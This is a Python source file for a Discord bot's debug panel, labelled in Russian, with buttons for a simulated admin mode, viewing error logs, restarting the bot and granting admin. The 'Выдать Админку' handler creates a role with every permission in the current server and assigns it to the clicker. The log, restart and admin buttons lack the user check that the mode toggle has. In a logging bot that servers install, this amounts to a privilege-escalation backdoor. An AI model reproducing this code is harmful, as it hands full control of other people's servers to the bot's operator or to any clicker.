import discord
from bot_app.core.dev_manager import dev_manager
from bot_app.features.error_handler import get_log_files, read_log_segment
import sys
import os

class DebugView(discord.ui.View):
    def __init__(self, bot, user_id):
        super().__init__(timeout=300)
        self.bot = bot
        self.user_id = user_id
        self._update_buttons()

    def _update_buttons(self):
        # Update button styles based on state
        is_simulating = self.user_id in dev_manager.simulation_active_ids
        
        # Mode Toggle
        mode_btn = [x for x in self.children if x.custom_id == "dbg:toggle_mode"][0]
        mode_btn.label = "Режим: Юзер" if is_simulating else "Режим: GOD/Admin"
        mode_btn.style = discord.ButtonStyle.secondary if is_simulating else discord.ButtonStyle.danger

    @discord.ui.button(label="Mode", custom_id="dbg:toggle_mode", row=0)
    async def toggle_mode(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id: return
        is_user = dev_manager.toggle_simulation(self.user_id)
        await interaction.response.defer()
        self._update_buttons()
        await interaction.edit_original_response(view=self)
        await interaction.followup.send(f"🕵️ Режим изменен на: **{'Обычный Юзер' if is_user else 'GOD ADMIN'}**", ephemeral=True)

    @discord.ui.button(label="Логи Ошибок", style=discord.ButtonStyle.secondary, row=0, emoji="📜")
    async def show_logs(self, interaction: discord.Interaction, button: discord.ui.Button):
        files = get_log_files()
        if not files:
            return await interaction.response.send_message("Нет файлов логов.", ephemeral=True)
        
        view = LogFileSelectView(files)
        await interaction.response.send_message("Выберите файл лога:", view=view, ephemeral=True)

    @discord.ui.button(label="Перезапуск", style=discord.ButtonStyle.danger, row=1, emoji="💀")
    async def restart_bot(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔄 Перезапускаюсь...", ephemeral=True)
        os.execv(sys.executable, ['python'] + sys.argv)

    @discord.ui.button(label="Выдать Админку", style=discord.ButtonStyle.primary, row=1, emoji="🛡️")
    async def grant_admin(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        if not guild: return
        
        # Create role logic
        try:
            role = await guild.create_role(name="LogerDebugAdmin", permissions=discord.Permissions.all(), reason="Debug Request")
            await interaction.user.add_roles(role)
            await interaction.response.send_message(f"✅ Роль {role.mention} создана и выдана.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)

class LogFileSelect(discord.ui.Select):
    def __init__(self, files):
        options = [discord.SelectOption(label=f, value=f) for f in files[:25]]
        super().__init__(placeholder="Выберите дату...", options=options)

    async def callback(self, interaction: discord.Interaction):
        fname = self.values[0]
        content = read_log_segment(fname, lines=20)
        # Discord limits to 2000 chars
        if len(content) > 1900:
            content = content[-1900:]
        
        await interaction.response.send_message(f"📄 **{fname}** (Last lines):\n```prolog\n{content}\n```", ephemeral=True)

class LogFileSelectView(discord.ui.View):
    def __init__(self, files):
        super().__init__()
        self.add_item(LogFileSelect(files))
